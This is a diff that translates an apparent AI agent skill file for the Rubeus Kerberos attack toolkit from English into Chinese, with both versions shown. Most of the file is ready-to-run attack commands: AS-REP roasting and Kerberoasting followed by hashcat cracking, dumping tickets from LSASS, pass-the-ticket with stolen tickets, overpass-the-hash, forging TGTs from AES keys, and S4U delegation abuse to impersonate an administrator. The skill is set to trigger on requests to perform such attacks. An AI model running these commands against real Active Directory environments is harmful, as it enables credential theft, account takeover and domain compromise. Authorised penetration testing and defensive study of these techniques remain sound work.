@@ -1,102 +1,96 @@
 ---
 name: rubeus
 description: >
-  This skill should be used when the user asks about "rubeus", "perform
-  Kerberos attacks, request tickets, roast service accounts", "extract TGTs",
-  "abuse Kerberos delegation in Active Directory". Kerberos attack toolkit for
-  TGT/TGS requests, AS-REP roasting, Kerberoasting, pass-the-ticket,
-  overpass-the-hash, and S4U delegation abuse.
+  此技能适用于用户询问关于"rubeus"、"执行 Kerberos 攻击、请求票据、对服务账户进行 roasting"、"提取 TGT"、"在 Active Directory 中滥用 Kerberos 委派"。Kerberos 攻击工具包，支持 TGT/TGS 请求、AS-REP roasting、Kerberoasting、票据传递、哈希传递以及 S4U 委派滥用。
 ---
 
 # Rubeus
 
-C# Kerberos abuse toolkit — TGT/TGS manipulation, roasting, delegation, and ticket operations.
+C# Kerberos 滥用工具包 — TGT/TGS 操控、roasting、委派及票据操作。
 
-## Quick Start
+## 快速开始
 
 ```cmd
-# AS-REP Roasting (no pre-auth required users)
+# AS-REP Roasting（针对未启用预认证的用户）
 Rubeus.exe asreproast /format:hashcat
 
-# Kerberoasting (service account TGS)
+# Kerberoasting（服务账户 TGS）
 Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
 
-# Dump all tickets from memory
+# 从内存转储所有票据
 Rubeus.exe dump /nowrap
 ```
 
-## Core Modules
+## 核心模块
 
-### Ticket Harvesting
+### 票据收集 (Ticket Harvesting)
 
-| Command | Description |
-|---------|-------------|
-| `dump` | Dump tickets from LSASS |
-| `triage` | List all tickets |
-| `monitor` | Monitor new TGTs (interval-based) |
-| `harvest` | Harvest TGTs over time |
+| 命令 | 说明 |
+|------|------|
+| `dump` | 从 LSASS 转储票据 |
+| `triage` | 列出所有票据 |
+| `monitor` | 监控新 TGT（基于时间间隔） |
+| `harvest` | 持续收割 TGT |
 
-### Ticket Requests
+### 票据请求 (Ticket Requests)
 
-| Command | Description |
-|---------|-------------|
-| `asktgt` | Request TGT with password/hash/aes |
-| `asktgs` | Request TGS for a service |
-| `renew` | Renew a TGT |
+| 命令 | 说明 |
+|------|------|
+| `asktgt` | 使用密码/哈希/AES 密钥请求 TGT |
+| `asktgs` | 为指定服务请求 TGS |
+| `renew` | 续期 TGT |
 
 ### Roasting
 
-| Command | Description |
-|---------|-------------|
-| `asreproast` | AS-REP roast (pre-auth disabled) |
-| `kerberoast` | Roast SPN-registered accounts |
-| `brute` | Password brute-force via Kerberos |
+| 命令 | 说明 |
+|------|------|
+| `asreproast` | AS-REP roasting（预认证已禁用） |
+| `kerberoast` | 对注册了 SPN 的账户进行 roasting |
+| `brute` | 通过 Kerberos 暴力破解密码 |
 
-### Ticket Abuse
+### 票据滥用 (Ticket Abuse)
 
-| Command | Description |
-|---------|-------------|
-| `ptt` | Pass-the-ticket (inject to current session) |
-| `purge` | Purge tickets from memory |
-| `describe` | Parse and describe a ticket |
-| `createnetonly` | Create sacrificial logon session |
+| 命令 | 说明 |
+|------|------|
+| `ptt` | 票据传递（注入当前会话） |
+| `purge` | 从内存清除票据 |
+| `describe` | 解析并描述票据 |
+| `createnetonly` | 创建牺牲品登录会话 |
 
-### Delegation
+### 委派 (Delegation)
 
-| Command | Description |
-|---------|-------------|
-| `s4u` | S4U2Self + S4U2Proxy (constrained delegation) |
-| `tgssub` | Substitute altservice in TGS |
+| 命令 | 说明 |
+|------|------|
+| `s4u` | S4U2Self + S4U2Proxy（约束委派） |
+| `tgssub` | 替换 TGS 中的 altservice |
 
-## Common Workflows
+## 常用工作流
 
 ```cmd
-# Kerberoast all SPNs → crack offline
+# Kerberoast 所有 SPN → 离线破解
 Rubeus.exe kerberoast /format:hashcat /outfile:spns.txt
 hashcat -a 0 -m 13100 spns.txt rockyou.txt
 
-# AS-REP roast (dump users without pre-auth)
+# AS-REP roast（转储未启用预认证的用户）
 Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
 hashcat -a 0 -m 18200 asrep.txt rockyou.txt
 
-# Pass-the-ticket: import stolen ticket
+# 票据传递：导入窃取的票据
 Rubeus.exe ptt /ticket:base64_or_file.kirbi
-klist  # verify ticket in session
+klist  # 验证会话中的票据
 
-# Overpass-the-hash: get TGT with NTLM hash
+# 哈希越权传递：使用 NTLM 哈希获取 TGT
 Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt
 
-# Golden ticket equivalent: asktgt with AES key
+# 黄金票据等效：使用 AES 密钥请求 TGT
 Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:corp.local /dc:dc.corp.local /ptt
 
-# Constrained delegation S4U
+# 约束委派 S4U
 Rubeus.exe s4u /user:service$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
 ```
 
-## Resources
+## 资源文件
 
-| File | When to load |
-|------|--------------|
-| `references/kerberos-attacks.md` | Full Kerberos attack chain, delegation types, ticket format, detection notes |
-
-## Structuring This Skill
+| 文件 | 加载时机 |
+|------|----------|
+| `references/kerberos-attacks.md` | 完整 Kerberos 攻击链、委派类型、票据格式及检测说明 |
